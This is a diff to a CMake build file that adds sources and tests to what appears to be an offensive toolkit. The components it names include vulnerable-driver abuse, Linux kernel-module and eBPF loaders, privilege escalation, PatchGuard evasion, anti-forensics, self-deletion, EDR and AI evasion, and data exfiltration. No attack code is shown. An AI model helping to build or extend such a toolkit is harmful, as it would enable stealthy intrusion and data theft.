@@ -31,15 +31,26 @@ if(WINDOWS_BUILD)
         ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/anti_forensics/logs.c
         ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/anti_forensics/self_delete.c
         ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/byovd/btr_abuse.c
+        ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/byovd/byovd.c
         ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/kernel/patchguard_peekaboo.c
+        ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/audit/audit.c
         ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/exfil/enhanced_exfiltration.c
     )
 endif()
+
+# Cross-platform sources
+list(APPEND RUNTIME_SOURCES
+    ${CMAKE_SOURCE_DIR}/../../src/runtime/core/plugin.c
+    ${CMAKE_SOURCE_DIR}/../../src/runtime/core/sandbox.c
+)
 
 # Linux-specific sources
 if(LINUX_BUILD)
     list(APPEND RUNTIME_SOURCES
         ${CMAKE_SOURCE_DIR}/../../src/runtime/linux/lpe/fence2pwn.c
+        ${CMAKE_SOURCE_DIR}/../../src/runtime/linux/kernel/lkm_loader.c
+        ${CMAKE_SOURCE_DIR}/../../src/runtime/linux/kernel/ebpf_loader.c
+        ${CMAKE_SOURCE_DIR}/../../src/runtime/linux/forensics/linux_forensics.c
         ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/exfil/enhanced_exfiltration.c
     )
 endif()
@@ -63,15 +74,26 @@ if(WINDOWS_BUILD)
         ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/byovd/btr_abuse.c
     )
 
+    add_executable(test_btr_manifest
+        test_btr_manifest.c
+        ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/byovd/byovd.c
+    )
+
     add_executable(test_patchguard_peekaboo
         test_patchguard_peekaboo.c
         ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/kernel/patchguard_peekaboo.c
+    )
+
+    add_executable(test_audit
+        test_audit.c
+        ${CMAKE_SOURCE_DIR}/../../src/runtime/windows/audit/audit.c
     )
 
     # Windows-only tests
     target_link_libraries(test_edrhoker PRIVATE ws2_32 iphlpapi)
     target_link_libraries(test_forensics PRIVATE advapi32)
     target_link_libraries(test_btr_abuse PRIVATE setupapi)
+    target_link_libraries(test_btr_manifest PRIVATE setupapi)
 endif()
 
 if(LINUX_BUILD)
@@ -79,6 +101,31 @@ if(LINUX_BUILD)
         test_fence2pwn.c
         ${CMAKE_SOURCE_DIR}/../../src/runtime/linux/lpe/fence2pwn.c
     )
+
+    add_executable(test_lkm
+        test_lkm.c
+        ${CMAKE_SOURCE_DIR}/../../src/runtime/linux/kernel/lkm_loader.c
+    )
+
+    add_executable(test_ebpf
+        test_ebpf.c
+        ${CMAKE_SOURCE_DIR}/../../src/runtime/linux/kernel/ebpf_loader.c
+    )
+endif()
+
+# Cross-platform tests
+add_executable(test_plugin
+    test_plugin.c
+    ${CMAKE_SOURCE_DIR}/../../src/runtime/core/plugin.c
+)
+
+add_executable(test_sandbox
+    test_sandbox.c
+    ${CMAKE_SOURCE_DIR}/../../src/runtime/core/sandbox.c
+)
+
+if(LINUX_BUILD)
+    target_link_libraries(test_sandbox PRIVATE m)
 endif()
 
 # Cross-platform test
@@ -107,14 +154,21 @@ if(WINDOWS_BUILD)
     add_test(NAME EDRChoker COMMAND test_edrhoker)
     add_test(NAME AntiForensics COMMAND test_forensics)
     add_test(NAME BTRReforged COMMAND test_btr_abuse)
+    add_test(NAME BTRManifest COMMAND test_btr_manifest)
     add_test(NAME PatchGuardPeekaboo COMMAND test_patchguard_peekaboo)
+    add_test(NAME Audit COMMAND test_audit)
 endif()
 
 if(LINUX_BUILD)
     add_test(NAME Fence2Pwn COMMAND test_fence2pwn)
+    add_test(NAME LKMLoader COMMAND test_lkm)
+    add_test(NAME eBPFLoader COMMAND test_ebpf)
 endif()
 
 add_test(NAME AIEvasion COMMAND test_ai_evasion)
+add_test(NAME Plugin COMMAND test_plugin)
+add_test(NAME Sandbox COMMAND test_sandbox)
+
 if(WINDOWS_BUILD)
     add_test(NAME Exfiltration COMMAND test_exfiltration)
 endif()
